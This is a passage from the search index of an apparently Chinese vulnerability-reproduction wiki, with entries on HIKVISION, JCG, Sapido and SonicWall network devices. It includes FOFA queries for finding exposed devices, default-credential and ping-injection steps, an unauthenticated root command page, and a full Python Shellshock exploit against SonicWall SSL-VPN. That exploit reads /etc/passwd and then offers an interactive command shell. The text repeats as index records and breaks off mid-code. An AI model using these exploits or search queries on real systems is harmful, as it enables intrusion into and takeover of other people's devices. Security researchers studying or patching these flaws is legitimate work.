)","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d HIKVISION_Video_coding_equipment_Download_any_file","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"JCG JHR-N835R \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 JCG JHR-N835R \u540e\u53f0\u5b58\u5728\u547d\u4ee4\u6267\u884c\uff0c\u901a\u8fc7 ; \u5206\u5272 ping \u547d\u4ee4\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] JCG JHR-N835R Shodan \u00b6 [!NOTE] JHR-N835R \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762 admin admin\u767b\u5f55 \u5728\u540e\u53f0\u7cfb\u7edf\u5de5\u5177\u90a3\u4f7f\u7528 PING\u5de5\u5177\uff0c\u4f7f\u7528 ; \u547d\u4ee4\u6267\u884c\u7ed5\u8fc7","title":"JCG JHR-N835R \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#jcg-jhr-n835r-\u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"JCG JHR-N835R \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"JCG JHR-N835R \u540e\u53f0\u5b58\u5728\u547d\u4ee4\u6267\u884c\uff0c\u901a\u8fc7 ; \u5206\u5272 ping \u547d\u4ee4\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] JCG JHR-N835R","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#shodan","text":"[!NOTE] JHR-N835R","title":"Shodan"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/JCG/JCG%20JHR-N835R%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762 admin admin\u767b\u5f55 \u5728\u540e\u53f0\u7cfb\u7edf\u5de5\u5177\u90a3\u4f7f\u7528 PING\u5de5\u5177\uff0c\u4f7f\u7528 ; \u547d\u4ee4\u6267\u884c\u7ed5\u8fc7","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"Sapido\u591a\u6b3e\u8def\u7531\u5668\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Sapido\u591a\u6b3e\u8def\u7531\u5668\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u5bfc\u81f4\u4efb\u610f\u8bbf\u95ee\u8005\u53ef\u4ee5\u4ee5Root\u6743\u9650\u6267\u884c\u547d\u4ee4 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 FOFA \u00b6 [!NOTE] app=\"Sapido-\u8def\u7531\u5668\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u56fa\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2aasp\u6587\u4ef6\u4e3a syscmd.asp \u5b58\u5728\u547d\u4ee4\u6267\u884c \u8bbf\u95ee\u76ee\u6807: http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm \u76f4\u63a5\u8f93\u5165\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86","title":"Sapido\u591a\u6b3e\u8def\u7531\u5668\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sapido\u591a\u6b3e\u8def\u7531\u5668\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"Sapido\u591a\u6b3e\u8def\u7531\u5668\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Sapido\u591a\u6b3e\u8def\u7531\u5668\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u5bfc\u81f4\u4efb\u610f\u8bbf\u95ee\u8005\u53ef\u4ee5\u4ee5Root\u6743\u9650\u6267\u884c\u547d\u4ee4","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"Sapido-\u8def\u7531\u5668\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Sapido/Sapido%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u56fa\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2aasp\u6587\u4ef6\u4e3a syscmd.asp \u5b58\u5728\u547d\u4ee4\u6267\u884c \u8bbf\u95ee\u76ee\u6807: http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm \u76f4\u63a5\u8f93\u5165\u5c31\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\u4e86","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"SonicWall SSL-VPN \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 SonicWall SSL-VPN \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u57281\u670824\u65e5\u88ab\u516c\u5f00 EXP\uff0c\u6b64\u8bbe\u5907\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] SonicWall SSL-VPN FOFA \u00b6 [!NOTE] app=\"SONICWALL-SSL-VPN\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR = \"Usage: $0 <jar/class file> <path-to-working directory>\" # Validate number of args if [ $# -ne 2 ] ; then echo ${ USAGE_STR } ; exit -1 ; fi for param in $* ; do if [ \" $param \" == \"-h\" ] ; then echo ${ USAGE_STR } ; exit 1 ; fi done # constants BOUNDARY = \"-------------------------------------------------------------\" BASE_DIR = /tmp JAVA_SRC = $1 WDIR = $2 CWD = ` pwd ` FULL_JAVA_SRC_PATH = ${ BASE_DIR } / ${ WDIR } / ${ JAVA_SRC } CLASSES_DIR = classes META_INF_DIR = ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF MANIFEST = ${ META_INF_DIR } /MANIFEST.MF MANIFEST_DIGEST_FILE = ${ META_INF_DIR } /SWALL_SIGNATURE.SF SIGNATURE_FILE = ${ META_INF_DIR } /SWALL_SIGNATURE.DSA CODESIGNER_CRT = ./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY = ./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN = 0 if [ ! -f ${ FULL_JAVA_SRC_PATH } ] ; then echo \"File not found: ${ FULL_JAVA_SRC_PATH } \" ; exit -2 ; fi if [ ${ JAVA_SRC ##*. } == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${ BASE_DIR } / $WDIR / $CLASSES_DIR # unzip jar unzip -d ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } ${ FULL_JAVA_SRC_PATH } ; # Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files = ` /bin/ls ${ META_INF_DIR } /*. [ sS ][ fF ] ` old_sign_files = ` /bin/ls ${ META_INF_DIR } /*. [ rRdD ][ sS ][ aA ] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN = 1 ; break done ; break ; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF/*. [ sSmM ][ fF ] ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF/*.? [ sS ][ aA ] OUTPUT_JAR = \" ${ FULL_JAVA_SRC_PATH } \" classfiles = ` /usr/bin/find ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } -type f ` #New Manifest file MANIFEST_MAIN_ATTR = \"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${ MANIFEST_MAIN_ATTR } > ${ MANIFEST } for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS = ` openssl dgst -sha1 -binary $file | openssl base64 ` MANIFEST_ENTRY = \"Name: ${ file ## ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } / } \\nSHA1-Digest: ${ SHA1_MANIFEST_ENTRY_CLASS } \\n\" echo -e ${ MANIFEST_ENTRY } >> ${ MANIFEST } echo $BOUNDARY done if [ ${ DO_SIGN } == 1 ] ; then echo -e \"Creating Manifest Signature file and Signature block\" >> $OUTLOG /usr/sbin/sw_jarsigner -m ${ MANIFEST } -s ${ MANIFEST_DIGEST_FILE } -S ${ SIGNATURE_FILE } -c ${ CODESIGNER_CRT } -k ${ CODESIGNER_PVTKEY } fi rm -f ${ FULL_JAVA_SRC_PATH } cd ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } ; zip -r ${ OUTPUT_JAR } * cd ${ CWD } # clean rm -Rf ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } elif [ ${ JAVA_SRC ##*. } == \"class\" ] ; then # if file is a class if [ ! -e ${ FULL_JAVA_SRC_PATH } ] ; then echo \"File not found: ${ FULL_JAVA_SRC_PATH } \" ; exit -2 ; fi ./jdasm ${ FULL_JAVA_SRC_PATH } ${ FULL_JAVA_SRC_PATH } ; fi echo \"Recursive Class Rewrite Completed.\" exit 0 ; \u8fd9\u4e2a\u6587\u4ef6\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u89e6\u53d1\u5728 Usage-Agent \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5373\u53ef\u547d\u4ee4\u6267\u884c GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { : ; } ; echo ; /bin/bash -c 'cat /etc/passwd' \u53d1\u9001\u8bf7\u6c42\u4f1a\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u4e3a\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: SonicWall SSL-VPN \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = { \"User-Agent\" : \"() { :; }; echo ; /bin/bash -c ' %s '\" % ( cmd )} try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/jarrewrite.sh \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = { \"User-Agent\" : \"() { :; }; echo ; /bin/bash -c ' %s '\" % ( cmd )} try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d SonicWall_SSL_VPN_RCE.json \u53c2\u8003\u6587\u7ae0 \u00b6 https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/","title":"SonicWall SSL-VPN \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sonicwall-ssl-vpn-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"SonicWall SSL-VPN \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"SonicWall SSL-VPN \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u57281\u670824\u65e5\u88ab\u516c\u5f00 EXP\uff0c\u6b64\u8bbe\u5907\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] SonicWall SSL-VPN","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"SONICWALL-SSL-VPN\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a /cgi-bin/jarrewrite.sh #!/bin/bash # jarrewrite.sh: # Script takes a jar/class file and a working directory; modifies class files # within the jar and repackages them. USAGE_STR = \"Usage: $0 <jar/class file> <path-to-working directory>\" # Validate number of args if [ $# -ne 2 ] ; then echo ${ USAGE_STR } ; exit -1 ; fi for param in $* ; do if [ \" $param \" == \"-h\" ] ; then echo ${ USAGE_STR } ; exit 1 ; fi done # constants BOUNDARY = \"-------------------------------------------------------------\" BASE_DIR = /tmp JAVA_SRC = $1 WDIR = $2 CWD = ` pwd ` FULL_JAVA_SRC_PATH = ${ BASE_DIR } / ${ WDIR } / ${ JAVA_SRC } CLASSES_DIR = classes META_INF_DIR = ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF MANIFEST = ${ META_INF_DIR } /MANIFEST.MF MANIFEST_DIGEST_FILE = ${ META_INF_DIR } /SWALL_SIGNATURE.SF SIGNATURE_FILE = ${ META_INF_DIR } /SWALL_SIGNATURE.DSA CODESIGNER_CRT = ./../../var/cs_cert/httprpCodeSignerX509Crt.pem CODESIGNER_PVTKEY = ./../../var/cs_cert/httprpCodeSignerPvtkey.pem DO_SIGN = 0 if [ ! -f ${ FULL_JAVA_SRC_PATH } ] ; then echo \"File not found: ${ FULL_JAVA_SRC_PATH } \" ; exit -2 ; fi if [ ${ JAVA_SRC ##*. } == \"jar\" ] # Using bracket in variable substitution. then # organize mkdir ${ BASE_DIR } / $WDIR / $CLASSES_DIR # unzip jar unzip -d ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } ${ FULL_JAVA_SRC_PATH } ; # Simple sanity check to see if the JAR has already been signed. # FIXME: This is not a complete check,because the original JAR signature # has to be verified completely otherwise a malicious applet # could access the local resources with SSL VPN signing it. old_sf_files = ` /bin/ls ${ META_INF_DIR } /*. [ sS ][ fF ] ` old_sign_files = ` /bin/ls ${ META_INF_DIR } /*. [ rRdD ][ sS ][ aA ] ` for sf_file in $old_sf_files do for sign_file in $old_sign_files do DO_SIGN = 1 ; break done ; break ; done # remove all manifest info including signatures # remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA rm -f ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF/*. [ sSmM ][ fF ] ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } /META-INF/*.? [ sS ][ aA ] OUTPUT_JAR = \" ${ FULL_JAVA_SRC_PATH } \" classfiles = ` /usr/bin/find ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } -type f ` #New Manifest file MANIFEST_MAIN_ATTR = \"Manifest-Version: 1.0\\nCreated-By: 1.0 (SonicWALL Inc.)\\n\" echo -e \"Creating Manifest file ... \" echo -e ${ MANIFEST_MAIN_ATTR } > ${ MANIFEST } for file in $classfiles do echo $BOUNDARY echo $file echo $BOUNDARY ./jdasm $file $file #Update manifest file SHA1_MANIFEST_ENTRY_CLASS = ` openssl dgst -sha1 -binary $file | openssl base64 ` MANIFEST_ENTRY = \"Name: ${ file ## ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } / } \\nSHA1-Digest: ${ SHA1_MANIFEST_ENTRY_CLASS } \\n\" echo -e ${ MANIFEST_ENTRY } >> ${ MANIFEST } echo $BOUNDARY done if [ ${ DO_SIGN } == 1 ] ; then echo -e \"Creating Manifest Signature file and Signature block\" >> $OUTLOG /usr/sbin/sw_jarsigner -m ${ MANIFEST } -s ${ MANIFEST_DIGEST_FILE } -S ${ SIGNATURE_FILE } -c ${ CODESIGNER_CRT } -k ${ CODESIGNER_PVTKEY } fi rm -f ${ FULL_JAVA_SRC_PATH } cd ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } ; zip -r ${ OUTPUT_JAR } * cd ${ CWD } # clean rm -Rf ${ BASE_DIR } / ${ WDIR } / ${ CLASSES_DIR } elif [ ${ JAVA_SRC ##*. } == \"class\" ] ; then # if file is a class if [ ! -e ${ FULL_JAVA_SRC_PATH } ] ; then echo \"File not found: ${ FULL_JAVA_SRC_PATH } \" ; exit -2 ; fi ./jdasm ${ FULL_JAVA_SRC_PATH } ${ FULL_JAVA_SRC_PATH } ; fi echo \"Recursive Class Rewrite Completed.\" exit 0 ; \u8fd9\u4e2a\u6587\u4ef6\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u89e6\u53d1\u5728 Usage-Agent \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5373\u53ef\u547d\u4ee4\u6267\u884c GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh User-Agent: () { : ; } ; echo ; /bin/bash -c 'cat /etc/passwd' \u53d1\u9001\u8bf7\u6c42\u4f1a\u4e0b\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u4e3a\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: SonicWall SSL-VPN \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , cmd ): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = { \"User-Agent\" : \"() { :; }; echo ; /bin/bash -c ' %s '\" % ( cmd )} try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/jarrewrite.sh \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u6267\u884c cat /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( 